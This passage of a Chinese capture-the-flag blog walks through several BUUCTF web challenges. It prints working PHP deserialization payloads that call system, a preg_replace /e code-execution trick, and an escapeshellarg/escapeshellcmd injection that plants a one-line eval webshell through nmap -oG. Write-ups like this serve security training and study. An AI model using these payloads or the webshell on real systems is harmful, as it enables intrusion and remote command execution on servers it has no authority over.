class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<ul>
<li>方法一：</li>
</ul>
<p>前文我们发现sql字段数是4，猜测对应id,username,passwd,data。可以利用select语句，在data中传入我们想要读取flag文件的URL(file://www/var/html/flag.php)读取flag：</p>
<p>创造反序列化字符串：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;rainstar&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;file://www/var/html/flag.php&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInfo</span>();<br><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>传入数据库：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746954731088.png" srcset="/img/loading.gif" lazyload alt="1746954731088"></p>
<p>查看源代码base64解码即可：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746954751288.png" srcset="/img/loading.gif" lazyload alt="1746954751288"></p>
<ul>
<li>方法二：利用数据库直接读取文件</li>
</ul>
<p>查看数据库权限：root</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746954825149.png" srcset="/img/loading.gif" lazyload alt="1746954825149"></p>
<p>借助load_file读取文件：</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746955202405.png" srcset="/img/loading.gif" lazyload alt="1746955202405"></p>
<p>在源码中获得flag:</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1746955235769.png" srcset="/img/loading.gif" lazyload alt="1746955235769"></p>
<h2 id="网鼎杯-2020-朱雀组-phpweb">[网鼎杯 2020 朱雀组]phpweb</h2>
<ol>
<li>页面一直在发送数据，抓包查看：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747016942464.png" srcset="/img/loading.gif" lazyload alt="1747016942464"></p>
<p>结合报错，func为调用的函数名，p为函数的参数。</p>
<ol start="2">
<li>尝试执行system(‘ls’):被过滤</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747017096265.png" srcset="/img/loading.gif" lazyload alt="1747017096265"></p>
<ol start="3">
<li>使用file_get_contents函数读取源码：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747017167700.png" srcset="/img/loading.gif" lazyload alt="1747017167700"></p>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这里禁用了很多系统执行函数，通过post方法传的func需要经过函数过滤才能进入gettime()执行<code>call_user_func()</code>函数。</p>
<ul>
<li>call_user_func函数：</li>
</ul>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747017392311.png" srcset="/img/loading.gif" lazyload alt="1747017392311"></p>
<ol start="4">
<li>
<p>但我们发现，Test类的destruction函数也可以进入gettime()执行<code>call_user_func()</code>函数。我们只需要寻找反序列化入口。</p>
<p>这里过滤的函数没有unserialize，可以通过post传入unserialize函数，构造Test对象，在程序结束时就会自动调用destruction函数，执行我们传入的反序列化字符串的命令。</p>
</li>
<li>
<p>构造反序列化字符串：</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#找flag</span><br><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;find / -iname &#x27;flag*&#x27;&quot;</span>;   <span class="hljs-comment">#不区分大小写</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    &#125;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    <span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#读取</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;    <span class="hljs-comment">#不区分大小写</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>    &#125;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    <span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747018305865.png" srcset="/img/loading.gif" lazyload alt="1747018305865"></p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747018434495.png" srcset="/img/loading.gif" lazyload alt="1747018434495"></p>
<h2 id="BJDCTF2020-The-mystery-of-ip">[BJDCTF2020]The mystery of ip</h2>
<ol>
<li>提示为<code>&lt;!-- Do you know why i know your ip? --&gt;</code>，尝试抓包修改X-Forwarded-For字段</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747019042446.png" srcset="/img/loading.gif" lazyload alt="1747019042446"></p>
<p>渲染的字符串可控，尝试是否存在SSTI漏洞</p>
<ol start="2">
<li>修改X-Forwarded-For字段：验证存在SSTI漏洞</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747019174462.png" srcset="/img/loading.gif" lazyload alt="1747019174462"></p>
<ol start="3">
<li>获取flag:</li>
</ol>
<p>这里的flag为首页<code>flag</code>标签对应的页面。</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747019333872.png" srcset="/img/loading.gif" lazyload alt="1747019333872"></p>
<p>根目录下为真正的flag</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747019474304.png" srcset="/img/loading.gif" lazyload alt="1747019474304"></p>
<h2 id="BJDCTF2020-ZJCTF，不过如此">[BJDCTF2020]ZJCTF，不过如此</h2>
<ol>
<li>查看题目代码如下：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747055282060.png" srcset="/img/loading.gif" lazyload alt="1747055282060"></p>
<p>利用data协议传入text，利用filter协议读取next.php文件内容：(这里也可以利用input协议，抓包修改)</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747055378884.png" srcset="/img/loading.gif" lazyload alt="1747055378884"></p>
<ol start="2">
<li>next文件内容解码后如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>这里是<code>preg_replace(xx/e,function,str)</code>漏洞。</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%preg_replace /e</span><br>preg<span class="hljs-built_in">_</span>replace函数会对str进行关于xx/e的匹配，对于匹配到的项进行function函数。<br>这里主要是`/e`的漏洞，/e会把匹配到的项先当作php代码执行（在function函数之前）。<br><br><span class="hljs-comment">%strtolower(&quot;\\1&quot;)中的\1</span><br>（反向引用）<br>对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。<br>重点：每个缓冲区都可以使用 &#x27;<span class="hljs-keyword">\n</span>&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。<br>所以这里的 <span class="hljs-keyword">\1</span> 实际上指定的是第一个子匹配项<br>在进行strtolower之前，匹配到的第一个子匹配项，也就是<span class="hljs-keyword">\1</span>会被当作php代码执行。<br><br><span class="hljs-comment">%利用</span><br><span class="hljs-comment">%这里re和str可控</span><br>我们需要传入re使之能匹配到str，将str当作第一个匹配项，然后作为php代码执行。<br>这里re表示get方法传入的键名，str表示get方法传入的键值<br><br><span class="hljs-comment">%re=.*</span><br>这里表示任何字符，但通过get方法传入时，对于传入的非法的数组参数名（.），会将其转换成下划线，这就导致我们正则匹配失效。（.* =&gt; <span class="hljs-built_in">_</span>*）<br>替换为<span class="hljs-keyword">\S</span>*，<span class="hljs-keyword">\S</span>表示匹配非空字符<br><br><span class="hljs-comment">%value=$&#123;phpinfo()&#125;</span><br>将 <span class="hljs-built_in">$</span>&#123;phpinfo()&#125; 作为php代码执行时，会执行phpinfo()（返回结果是1），<br>最后strtolower函数内的参数内容为<span class="hljs-built_in">$</span>&#123;1&#125;，等价与<span class="hljs-built_in">$</span>1，这里不存在该变量，所以<span class="hljs-built_in">$</span>1等价于NULL，<br>所以strtolower(NULL)的结果为null<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>payload如下：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747058486190.png" srcset="/img/loading.gif" lazyload alt="1747058486190"></p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747058595848.png" srcset="/img/loading.gif" lazyload alt="1747058595848"></p>
<h2 id="BUUCTF-2018-Online-Tool">[BUUCTF 2018]Online Tool</h2>
<ol>
<li>题目代码如下：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747110465254.png" srcset="/img/loading.gif" lazyload alt="1747110465254"></p>
<ol start="2">
<li>这里存在两个函数：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%escapeshellarg</span><br>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数<br>功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，<br>这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)<br>简单来说：会把&#x27;=&gt;&#x27;<span class="hljs-keyword">\&#x27;</span>&#x27;,并在整个参数外用&#x27;包裹<br><br><span class="hljs-comment">%escapeshellcmd — shell 元字符转义</span><br>功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。<br>此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。<br>反斜线（<span class="hljs-keyword">\）</span>会在以下字符之前插入：<br><span class="hljs-built_in">&amp;</span><span class="hljs-params">#</span>;`|?~&lt;&gt;<span class="hljs-built_in">^</span>()[]&#123;&#125;<span class="hljs-built_in">$</span>, <span class="hljs-keyword">\x</span>0A 和 <span class="hljs-keyword">\xFF</span>。 *’ 和 “ 仅在不配对儿的时候被转义。<br>在 Windows 平台上，所有这些字符以及 <span class="hljs-comment">% 和 ! 字符都会被空格代替。</span><br>简单来说：会把&#x27;<span class="hljs-keyword">\&#x27;</span> =&gt; &#x27;<span class="hljs-keyword">\\</span>&#x27;，并且在不配对的&#x27;前加<span class="hljs-keyword">\</span><br><span class="hljs-keyword"></span><br>这两个函数按照该顺序使用会造成单引号闭合漏洞<br></code></pre></td></tr></table></figure>
<ol start="3">
<li>nmap命令：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">-oG 可以将命令写入文件<br></code></pre></td></tr></table></figure>
<ol start="4">
<li>构造payload:</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tex">?host=&#x27; &lt;?php @eval(<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>POST[1])?&gt; -oG a.php &#x27;(空格不能缺少，否则命令拆分错误)<br><br><span class="hljs-comment">%%escapeshellarg</span><br>&#x27;&#x27;<span class="hljs-keyword">\&#x27;</span>&#x27; &lt;?php @eval(<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>POST[1])?&gt; -oG a.php &#x27;<span class="hljs-keyword">\&#x27;</span>&#x27;&#x27;<br><span class="hljs-comment">%escapeshellcmd(主要针对引号，php代码中的转义不展开)</span><br>&#x27;&#x27;<span class="hljs-keyword">\\</span>&#x27;&#x27; &lt;?php @eval(<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>POST[1])?&gt; -oG a.php &#x27;<span class="hljs-keyword">\\</span>&#x27;&#x27;&#x27;<br>命令被拆分：&#x27;&#x27; + <span class="hljs-keyword">\ </span>+&#x27;&#x27;+ +php代码+ +<span class="hljs-keyword">\\</span>+&#x27;&#x27;<br>这里第一个<span class="hljs-keyword">\\</span>会被解释为<span class="hljs-keyword">\</span><br><span class="hljs-keyword"></span>第二个<span class="hljs-keyword">\\</span>被单引号包裹，解释为<span class="hljs-keyword">\\</span><br></code></pre></td></tr></table></figure>
<ol start="5">
<li>根据显示的上传目录蚁剑连接即可：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747111325732.png" srcset="/img/loading.gif" lazyload alt="1747111325732"></p>
<h2 id="GXYCTF2019-禁止套娃">[GXYCTF2019]禁止套娃</h2>
<ol>
<li>源码泄露，访问url/.git/被禁止，存在源码泄露：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747142220618.png" srcset="/img/loading.gif" lazyload alt="1747142220618"></p>
<ol start="2">
<li>使用githack工具下载源码：</li>
</ol>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747142307166.png" srcset="/img/loading.gif" lazyload alt="1747142307166"></p>
<ol start="3">
<li>源码如下：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>过滤条件解析：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])</span><br><span class="hljs-comment">%去掉转义</span><br>!preg<span class="hljs-built_in">_</span>match(&#x27;/data://|filter://|php://|phar:///i&#x27;, <span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;exp&#x27;])<br>不能匹配到一些伪协议<br><br><span class="hljs-comment">%&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])</span><br>拆分项：<br>/[a-z,<span class="hljs-built_in">_</span>]+   <span class="hljs-comment">%小写字母和逗号和下划线开头的一个或多个</span><br>(<br>(?R)?       <span class="hljs-comment">%(?R)引用当前表达式，后面加了?递归调用</span><br>)<br>这里要求匹配上，只能进行无参数命令调用<br><br><span class="hljs-comment">%!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])</span><br>不能有以上字符组合<br></code></pre></td></tr></table></figure>
<ol start="4">
<li>无参数命令执行：</li>
</ol>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-comment">%读取当前目录</span><br>scandir(&#x27;.&#x27;)，这里.在环境变量中寻找适合的值进行替代<br></code></pre></td></tr></table></figure>
<p>查看环境变量的值：<code>var_dump(localeconv())</code>,var_dump()可以用print_r()替换</p>
<p><img src="/2025/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1747144102739.png" srcset="/img/loading.gif" lazyload alt="1747144102739"></p>
